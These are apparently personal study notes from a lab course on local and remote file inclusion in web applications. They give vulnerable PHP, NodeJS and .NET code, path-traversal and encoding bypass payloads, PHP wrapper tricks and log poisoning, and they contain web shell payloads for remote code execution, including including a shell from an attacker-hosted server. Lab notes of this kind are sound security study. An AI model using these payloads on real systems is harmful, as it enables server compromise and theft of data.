# Local File Inclusion

---

## Intro To File Inclusions

<aside>
💡 Many modern back-end languages, such as `PHP`, `Javascript`, or `Java`, use HTTP parameters to specify what is shown on the web page, which allows for building dynamic web pages, reduces the script's overall size, and simplifies the code. In such cases, parameters are used to specify which resource is shown on the page. If such functionalities are not securely coded, an attacker may manipulate these parameters to display the content of any local file on the hosting server, leading to a [Local File Inclusion (LFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) vulnerability.

</aside>

# **Local File Inclusion (LFI)**

- How This Work
    
    The most common place we usually find LFI within is templating engines. In order to have most of the web application looking the same when navigating between pages, a templating engine displays a page that shows the common static parts, such as the `header`, `navigation bar`, and `footer`, and then dynamically loads other content that changes between pages. Otherwise, every page on the server would need to be modified when changes are made to any of the static parts. This is why we often see a parameter like `/index.php?page=about`, where `index.php`sets static content (e.g. header/footer), and then only pulls the dynamic content specified in the parameter, which in this case may be read from a file called `about.php` . As we have control over the `about`  portion of the request, it may be possible to have the web application grab other files and display them on the page.
    
- How This Can be Dangerous
    
    LFI vulnerabilities can lead to source code disclosure, sensitive data exposure, and even remote code execution under certain conditions. Leaking source code may allow attackers to test the code for other vulnerabilities, which may reveal previously unknown vulnerabilities. Furthermore, leaking sensitive data may enable attackers to enumerate the remote server for other weaknesses or even leak credentials and keys that may allow them to access the remote server directly. Under specific conditions, LFI may also allow attackers to execute code on the remote server, which may compromise the entire back-end server and any other servers connected to it.
    

### **Examples of Vulnerable Code**

### PHP

In `PHP`, we may use the `include()` function to load a local or a remote file as we load a page. If the `path` passed to the `include()` is taken from a user-controlled parameter, like a `GET` parameter, and `the code does not explicitly filter and sanitize the user input`, then the code becomes vulnerable to File Inclusion. The following code snippet shows an example of that:

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

We see that the `language` parameter is directly passed to the `include()` function. So, any path we pass in the `language` parameter will be loaded on the page, including any local files on the back-end server. This is not exclusive to the `include()` function, as there are many other PHP functions that would lead to the same vulnerability if we had control over the path passed into them. Such functions include `include_once()`,`require()`, `require_once()`, `file_get_contents()`, and several others as well.

### **NodeJS**

```jsx
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

As we can see, whatever parameter passed from the URL gets used by the `readfile` function, which then writes the file content in the HTTP response.

→ Another example is the `render()` function in the `Express.js` framework.

```jsx
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

Unlike our earlier examples where GET parameters were specified after a (`?`) character in the URL, the above example takes the parameter from the URL path (e.g. `/about/en` or `/about/es`). As the parameter is directly used within the `render()` function to specify the rendered file, we can change the URL to show a different file instead.

### .NET

The `Response.WriteFile` function works very similarly to all of our earlier examples, as it takes a file path for its input and writes its content to the response. The path may be retrieved from a GET parameter for dynamic content loading, as follows:

```csharp
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```

<aside>
💡 The most important thing to keep in mind is that `some of the above functions only read the content of the specified files, while others also execute the specified files`. Furthermore, some of them allow specifying remote URLs, while others only work with files local to the back-end server.

</aside>

## Exploitation

- Two common readable files that are available on most back-end servers are `/etc/passwd` on Linux and **`C:\Windows\boot.ini`**on Window

### **Basic LFI Exploitaion**

```csharp
http://178.62.84.158:32393/index.php?language=../../../../usr/share/flags/flag.txt
```

### **Path Traversal**

```php
include($_GET['language']);
```

<aside>
💡 In this case, if we try to read `/etc/passwd` , then the `include()` function would fetch that file directly.

</aside>

---

```php
include("./languages/" . $_GET['language']);
```

<aside>
💡 In this case, if we attempt to read `/etc/passwd`, then the path passed to `include()` would be (`./languages//etc/passwd`), and as this file does not exist, we will not be able to read anything

</aside>

- bypass
    
    We can easily bypass this restriction by traversing directories using `relative paths`. To do so, we can add `../` before our file name, which refers to the parent directory. For example, if the full path of the languages directory is `/var/www/html/languages/`, then using `../index.php` would refer to the `index.php` file on the parent directory(i.e. `/var/www/html/index.php`).
    
    So, we can use this trick to go back several directories until we reach the root path (i.e. `/`), and then specify our absolute file path (e.g. `../../../../etc/passwd`), and the file should exist.
    

### **Filename Prefix**

```php
include("lang_" . $_GET['language']);
```

<aside>
💡 n this case, if we try to traverse the directory with `../../../etc/passwd`, the final string would be `lang_../../../etc/passwd`, which is invalid

</aside>

- bypass
    
    we can prefix a `/` before our payload, and this should consider the prefix as a directory, and then we should bypass the filename and be able to traverse directories
    

---

## Basic Bypasses

### **Non-Recursive Path Traversal Filters**

<aside>
💡 One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (`../`) to avoid path traversals. For example:

```php
$language = str_replace('../', '', $_GET['language']);
```

We see that all `../` sub-strings were removed, which resulted in a final path being `./languages/etc/passwd`.

⇒ Bypass using `....//`:

```html
http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
```

⇒ Bypass using `..././`: 

```html
http://<SERVER_IP>:<PORT>/index.php?language=..././..././..././..././etc/passwd
```

</aside>

### **Encoding**

<aside>
💡 Some web filters may prevent input filters that include certain LFI-related characters, like a dot `.` or a slash `/` used for path traversals. However, some of these filters may be bypassed by URL encoding our input, such that it would no longer include these bad characters, but would still be decoded back to our path traversal string once it reaches the vulnerable function.

![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Inclusions%20273322b142ad4dd2806ca52bd28d7e9a/Study%20Notes%20e9a012804c054c9ea5aa1aa5ac36b644/Untitled.png)

⇒ Bypass

```php
<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
```

</aside>

### **Approved Paths**

<aside>
💡 Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. For example, the web application we have been dealing with may only accept paths that are under the `./languages` directory, as follows:

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

<aside>
🚩 To find the approved path, we can examine the requests sent by the existing forms, and see what path they use for the normal web functionality.

</aside>

⇒ Bypass

```php
<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
```

`Some web applications may apply this filter along with one of the earlier filters, so we may combine both techniques by starting our payload with the approved path, and then URL encode our payload or use recursive payload.`

</aside>

### **Appended Extension**

<aside>
💡 ome web applications append an extension to our input string (e.g. `.php`
), to ensure that the file we include is in the expected extension. With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful

</aside>

### Other Techniques For `PHP versions before 5.3/5.4`

**Path Truncation**

<aside>
💡 In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be `truncated`, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (`/etc/passwd/.`) then the `/.` would also be truncated, and PHP would call (`/etc/passwd`). PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. `////etc/passwd` is the same as `/etc/passwd`). Similarly, a current directory shortcut (`.`) in the middle of the path would also be disregarded (e.g. `/etc/./passwd`).

If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (`.php`) would be truncated, and we would have a path without an appended extension. Finally, it is also important to note that we would also need to `start the path with a non-existing directory` for this technique to work.

⇒ Payload

```php
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

</aside>

```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

**Null Bytes**

<aside>
💡 PHP versions before 5.5 were vulnerable to `null byte injection`, which means that adding a null byte (`%00`) at the end of the string would terminate the string and not consider anything after it

</aside>

> To exploit this vulnerability, we can end our payload with a null byte (e.g. `/etc/passwd%00`), such that the final path passed to `include()` would be (`/etc/passwd%00.php`). This way, even though `.php` is appended to our string, anything after the null byte would be truncated, and so the path used would actually be `/etc/passwd`, leading us to bypass the appended extension.
> 

### Here’s Come The `Flag` 🚩

![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Inclusions%20273322b142ad4dd2806ca52bd28d7e9a/Study%20Notes%20e9a012804c054c9ea5aa1aa5ac36b644/Untitled%201.png)

---

## `PHP` Filters

<aside>
💡 Many popular web applications are developed in PHP, along with various custom web applications built with different PHP frameworks, like Laravel or Symfony. If we identify an LFI vulnerability in PHP web applications, then we can utilize different [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) to be able to extend our LFI exploitation, and even potentially reach remote code execution.

</aside>

- PHP Wrappers
    
    PHP Wrappers allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams. This has a lot of uses for PHP developers. Still, as web penetration testers, we can utilize these wrappers to extend our exploitation attacks and be able to read PHP source code files or even execute system commands. This is not only beneficial with LFI attacks, but also with other web attacks like XXE, as covered in the [Web Attacks](https://academy.hackthebox.com/module/details/134) module.
    

### Input Filters

<aside>
💡 [PHP Filters](https://www.php.net/manual/en/filters.php) are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the `php://` scheme in our string, and we can access the PHP filter wrapper with `php://filter/`

</aside>

> The `filter` wrapper has several parameters, but the main ones we require for our attack are `resource` and `read`. The `resource` parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), while the `read` parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.
> 

> There are four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php). You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the `convert.base64-encode` filter, under `Conversion Filters`.
> 

### Fuzzing For `PHP` Files

```php
❯ ffuf -u http://209.97.179.123:30510/FUZZ.php -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -c
❯ gobuster dir --url http://209.97.179.123:30510 -t 64 -w /usr/share/wordlists/dirb/big.txt -x php
```

### Source Code Disclosure

<aside>
💡 Once we have a list of potential PHP files we want to read, we can start disclosing their sources with the `base64` PHP filter. Let's try to read the source code of `config.php` using the base64 filter, by specifying `convert.base64-encode` for the `read` parameter and `config` for the `resource`

</aside>

```php
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

---

# LFI ⇒ **Remote Code Execution**

<aside>
💡 we will start learning how we can use file inclusion vulnerabilities to execute code on the back-end servers and gain control over them.

</aside>

## **PHP Wrappers**

### **Checking PHP Configurations**

> To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version. We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. We will also use the `base64` filter we used in the previous section, as `.ini` files are similar to `.php` files and should be encoded to avoid breaking. Finally, we'll use cURL or Burp instead of a browser, as the output string could be very long and we should be able to properly capture it:
> 
> 
> ```php
> 0xR3Y4D@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
> <!DOCTYPE html>
> 
> <html lang="en">
> ...SNIP...
>  <h2>Containers</h2>
>     W1BIUF0KCjs7Ozs7Ozs7O
>     ...SNIP...
>     4KO2ZmaS5wcmVsb2FkPQo=
> <p class="read-more">
> ```
> 
> ```php
> 0xR3Y4D@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
> 
> allow_url_include = On
> ```
> 
> We see that we have this option enabled, so we can use the `data` wrapper. Knowing how to check for the `allow_url_include` option can be very important, as `this option is not enabled by default`, and is required for several other LFI attacks, like using the `input` wrapper or for any RFI attack
> 

### Data → RCE [`allow_url_include = On` required]

<aside>
💡 The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations.

</aside>

<aside>
💡 With `allow_url_include` enabled, we can proceed with our `data` wrapper attack. As mentioned earlier, the `data` wrapper can be used to include external data, including PHP code. We can also pass it `base64` encoded strings with `text/plain;base64`, and it has the ability to decode them and execute the PHP code.

</aside>

```php
0xR3Y4D@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

**Exploitaion :**

```html
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Inclusions%20273322b142ad4dd2806ca52bd28d7e9a/Study%20Notes%20e9a012804c054c9ea5aa1aa5ac36b644/Untitled%202.png)

OR 

```php
0xR3Y4D@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Input → RCE [`allow_url_include = On` required]

<aside>
💡 Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code. The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work.

</aside>

**Exploit** :

```php
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```

- **Note:**
    
    To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)
    

### **Expect → RCE [**`extension=expect`]

<aside>
💡 we may utilize the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.

</aside>

> expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases.
> 
> 
> ```php
> 0xR3Y4D@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
> ***extension=expect***
> ```
> 

> As we can see, the `extension` configuration keyword is used to enable the `expect` module, which means we should be able to use it for gaining RCE through the LFI vulnerability. To use the expect module, we can use the `expect://` wrapper and then pass the command we want to execute, as follows:
> 
> 
> ```php
> 0xR3Y4D@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
> ```
> 

### Here’s Come The `Flag` 🚩

```php
❯ base64 confg -d | grep allow_url
allow_url_fopen = On
allow_url_include = On
```

```php
❯ curl -s 'http://134.209.22.69:31567/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls%20%2F'
.
.
.
37809e2f8952f06139011994726d9ef1.txt
bin
boot
.
.
.
```

```bash
curl -s 'http://134.209.22.69:31567/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20%2F37809e2f8952f06139011994726d9ef1.txt' |grep HTB

            **HTB{d!$46l3_r3m0t3_url_!nclud3}**
```

---

# **Remote File Inclusion (RFI)**

**`we should always start by trying to include a local URL`**

<aside>
💡 When a vulnerable function allows us to include remote files, we may be able to host a malicious script, and then include it in the vulnerable page to execute malicious functions and gain remote code execution. If we refer to the table on the first section, we see that the following are some of the functions that (if vulnerable) would allow RFI:

| Function | Read Content | Execute | Remote URL |
| --- | --- | --- | --- |
| PHP |  |  |  |
| include()/include_once() | ✅ | ✅ | ✅ |
| require()/require_once() | ✅ | ✅ | ❌ |
| file_get_contents() | ✅ | ❌ | ✅ |
| fopen()/file() | ✅ | ❌ | ❌ |
| NodeJS |  |  |  |
| fs.readFile() | ✅ | ❌ | ❌ |
| fs.sendFile() | ✅ | ❌ | ❌ |
| res.render() | ✅ | ✅ | ❌ |
| Java |  |  |  |
| include | ✅ | ❌ | ❌ |
| import | ✅ | ✅ | ✅ |
| .NET |  |  |  |
| @Html.Partial() | ✅ | ❌ | ❌ |
| @Html.RemotePartial() | ✅ | ❌ | ✅ |
| Response.WriteFile() | ✅ | ❌ | ❌ |
| include | ✅ | ✅ | ✅ |
</aside>

> As we can see, almost any RFI vulnerability is also an LFI vulnerability, as any function that allows including remote URLs usually also allows including local ones. However, an LFI may not necessarily be an RFI. This is primarily because of three reasons:
> 
> 1. The vulnerable function may not allow including remote URLs
> 2. You may only control a portion of the filename and not the entire protocol wrapper (ex: `http://`, `ftp://`, `https://`).
> 3. The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.

## **Verify RFI**

```bash
0xR3Y4D@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On # SO IF THIS IS ALLOWED WE GOT 4 OPTIONS 1-> USE DATA WRAPPER IN PHP TO EXECUTE COMMANDS | 2-> use input wrapper | 3-> EXPLOIT RFI
```

## **Remote Code Execution with RFI**

```bash
0xR3Y4D@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### **HTTP**

```bash
0xR3Y4D@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
```

> Exploit:
> 
> 
> ```bash
> http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
> ```
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Inclusions%20273322b142ad4dd2806ca52bd28d7e9a/Study%20Notes%20e9a012804c054c9ea5aa1aa5ac36b644/Untitled%203.png)
> 

### FTP

```bash
0xR3Y4D@htb[/htb]$ sudo python -m pyftpdlib -p 21

[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
```

> Exploit
> 
> 
> ```bash
> http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
> ```
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Inclusions%20273322b142ad4dd2806ca52bd28d7e9a/Study%20Notes%20e9a012804c054c9ea5aa1aa5ac36b644/Untitled%204.png)
> 

# LFI and File Uploads

<aside>
💡 If the vulnerable function has code `Execute` capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type.

</aside>

## Image Upload

<aside>
💡 Image upload is very common in most modern web applications, as uploading images is widely regarded as safe if the upload function is securely coded. However, as discussed earlier, the vulnerability, in this case, is not in the file upload form but the file inclusion functionality.

</aside>

### **Crafting Malicious Image**

> Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, we will use an allowed image extension in our file name (e.g. `shell.gif`), and should also include the image magic bytes at the beginning of the file content (e.g. `GIF8`), just in case the upload form checks for both the extension and content type as well. We can do so as follows:
> 
> 
> ```bash
> 0xR3Y4D@htb[/htb]$ echo '**GIF8**<?php system($_GET["cmd"]); ?>' > shell.gif
> ```
> 

> Exploit :
> 
> 
> Once we've uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we need to know the path to our uploaded file. In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL. In our case, if we inspect the source code after uploading the image, we can get its URL:
> 
> ```bash
> <img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
> ```
> 
> ```bash
> http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
> ```
> 

## Upload Zip

<aside>
💡 We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named `shell.jpg`), as follows:

```bash
0xR3Y4D@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

</aside>

> Exploit :
> 
> 
> ```bash
> http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
> ```
> 

## **Phar Upload**

<aside>
💡 Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:

```bash
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
?>
```

</aside>

> This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg` as follows:
> 
> 
> ```bash
> 0xR3Y4D@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
> ```
> 

> Exploit :
> 
> 
> ```bash
> http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
> ```
> 

# Log Poisoning

<aside>
💡 We have seen in previous sections that if we include any file that contains PHP code, it will get executed, as long as the vulnerable function has the `Execute` privileges. The attacks we will discuss in this section all rely on the same concept: Writing PHP code in a field we control that gets logged into a log file (i.e. `poison`/`contaminate` the log file), and then include that log file to execute the PHP code.

</aside>

## **PHP Session Poisoning**

<aside>
💡 Most PHP web applications utilize `PHPSESSID` cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in `session` files on the back-end, and saved in `/var/lib/php/sessikons/` on Linux and in `C:\Windows\Temp\` on Windows. The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix.

</aside>

> The first thing we need to do in a PHP Session Poisoning attack is to examine our PHPSESSID session file and see if it contains any data we can control and poison. So, let's first check if we have a `PHPSESSID` cookie set to our session:
> 
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Inclusions%20273322b142ad4dd2806ca52bd28d7e9a/Study%20Notes%20e9a012804c054c9ea5aa1aa5ac36b644/Untitled%205.png)
> 
> As we can see, our `PHPSESSID` cookie value is `nhhv8i0o6ua4g88bkdl9u1fdsd`, so it should be stored at `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`. Let's try include this session file through the LFI vulnerability and view its contents:
> 
> ```bash
> http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
> ```
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Inclusions%20273322b142ad4dd2806ca52bd28d7e9a/Study%20Notes%20e9a012804c054c9ea5aa1aa5ac36b644/Untitled%206.png)
> 

> the `page` value is under our control, as we can control it through the `?language=` parameter.Let's try setting the value of `page` a custom value (e.g. `language parameter`) and see if it changes in the session file. We can do so by simply visiting the page with `?language=session_poisoning` specified, as follows:
> 
> 
> ```bash
> http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
> ```
> 
> ```bash
> http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
> ```
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Inclusions%20273322b142ad4dd2806ca52bd28d7e9a/Study%20Notes%20e9a012804c054c9ea5aa1aa5ac36b644/Untitled%207.png)
> 
> <aside>
> 💡 This time, the session file contains `session_poisoning` instead of `es.php`, which confirms our ability to control the value of `page` in the session file. Our next step is to perform the `poisoning` step by writing PHP code to the session file. We can write a basic PHP web shell by changing the `?language=` parameter to a URL encoded web shell, as follows:
> 
> </aside>
> 
> ```bash
> http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
> ```
> 
> Finally, we can include the session file and use the `&cmd=id` to execute a commands:
> 
> ```bash
> http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_qd62oq8u7n4tntha0msjjf1kfp&cmd=pwd
> ```
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Inclusions%20273322b142ad4dd2806ca52bd28d7e9a/Study%20Notes%20e9a012804c054c9ea5aa1aa5ac36b644/Untitled%208.png)
> 
> - NOTE
>     
>     Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.
>     

## **Server Log Poisoning**

<aside>
💡 Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header. As we can control the `User-Agent` header in our requests, we can use it to poison the server logs as we did above.

</aside>

- NOTE
    
    Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. `Nginx` logs are readable by low privileged users by default (e.g. `www-data`), while the `Apache` logs are only readable by users with high privileges (e.g. `root`/`adm` groups). However, in older or misconfigured `Apache` servers, these logs may be readable by low-privileged users.
    

<aside>
💡 By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows. However, the logs may be in a different location in some cases, so we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations.

</aside>

> So, let's try including the Apache access log from `/var/log/apache2/access.log`, and see what we get:
> 
> 
> **`http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log`**
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Inclusions%20273322b142ad4dd2806ca52bd28d7e9a/Study%20Notes%20e9a012804c054c9ea5aa1aa5ac36b644/Untitled%209.png)
> 
> As we can see, we can read the log. The log contains the `remote IP address`, `request page`, `response code`, and the `User-Agent` header. As mentioned earlier, the `User-Agent` header is controlled by us through the HTTP request headers, so we should be able to poison this value.
> 
> - TIP
>     
>      Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.
>     

> Exploit
> 
> 
> we will use `Burp Suite` to intercept our earlier LFI request and modify the `User-Agent` header to `Apache Log Poisoning`:
> 
> ![Untitled](../../../../0xN1ghtM4r3-Notebook%203351968cf3f74ad68a09245768551fca/0xR3Y4D-Notebook%207651c00ee0914affa2b674b2d962ac9c/Server%20Side%20Attacks%20b1a016ea12d5480c9b34a987022407f6/File%20Inclusions%20273322b142ad4dd2806ca52bd28d7e9a/Study%20Notes%20e9a012804c054c9ea5aa1aa5ac36b644/Untitled%2010.png)
> 
> **Note: As all requests to the server get logged, we can poison any request to the web application, and not necessarily the LFI one as we did above.**
> 
> As expected, our custom User-Agent value is visible in the included log file. Now, we can poison the `User-Agent` header by setting it to a basic PHP web shell:
> 
